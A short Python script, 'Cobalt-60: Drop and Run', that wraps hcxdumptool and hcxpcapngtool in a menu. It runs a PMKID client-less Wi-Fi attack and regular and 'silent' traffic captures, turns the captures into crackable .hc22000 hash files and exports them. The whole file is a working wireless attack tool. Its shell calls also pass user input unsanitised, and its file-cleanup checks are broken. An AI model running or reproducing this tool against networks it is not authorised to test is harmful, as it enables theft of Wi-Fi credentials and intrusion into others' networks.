#!/usr/bin/python3
# Base Tools: hcxdumptool hcxpcapngtool
import os
os.system("sudo systemctl stop wpa_supplicant")
os.system("sudo systemctl stop NetworkManager")
os.system("clear && hcxdumptool -I")
adapter = input("Wireless Adpter To Use: ")
os.system("clear")
def menu():
    os.system("clear")
    print("Cobalt-60: Drop and Run")
    print("[1] PMKID Client-less Attack")
    print("[2] Regular Traffic Capture")
    print("[3] Silent Traffic Capture")
    print("[4] Export Hashes/Dumps")
    print("[99] Exit")
    menin = input("C-60 >> ")
    if menin == "1" :
        pmkid()
    elif menin == "2" :
        rtc()
    elif menin == "3" :
        stc()
    elif menin == "4" :
        cpto()
    elif menin == "99" :
        if os.path.exists("/tmp/60-*") == "True":
            os.remove("/tmp/60-*")
        os.system("systemctl start wpa_supplicant.service &> /dev/null && systemctl start NetworkManager.service &> /dev/null && clear")
        exit()
    else:
        print(">:(")
        os.system("sleep 1.5")
        menu()
def pmkid():
    if os.path.exists("/tmp/60-pmkid-*") == "True":
        os.remove("/tmp/60-pmkid-*")
    os.system("hcxdumptool -i " + adapter + " -o /tmp/60-pmkid-dump.pcapng --disable_deauthentication --disable_client_attacks --enable_status=3")
    os.system("hcxpcapngtool -o /tmp/60-pmkid-hash.hc22000 /tmp/60-pmkid-dump.pcapng")
    input(".hc22000 and .pcapng files stored in /tmp\nPress ENTER to continue...")
    menu()
def rtc():
    if os.path.exists("/tmp/60-regular-*") == "True":
        os.remove("/tmp/60-regular-*")
    os.system("hcxdumptool -i " + adapter + " -o /tmp/60-regular-dump.pcapng --enable_status=15")
    os.system("hcxpcapngtool -o /tmp/60-regular-hash.hc22000 /tmp/60-regular-dump.pcapng")
    input(".hc22000 and .pcapng files stored in /tmp\nPress ENTER to continue...")
    menu()
def stc():
    if os.path.exists("/tmp/60-silent-*") == "True":
        os.remove("/tmp/60-silent-*")
    os.system("hcxdumptool -i " + adapter + " -o /tmp/60-silent-dump.pcapng --silent --enable_status=15")
    os.system("hcxpcapngtool -o /tmp/60-silent-hash.hc22000 /tmp/60-silent-dump.pcapng")
    input(".hc22000 and .pcapng files stored in /tmp\nPress ENTER to continue...")
    menu()
def cpto():
    cptoloc = input("Export Location: ")
    os.system("cp /tmp/60* " + cptoloc)
    menu()
menu()
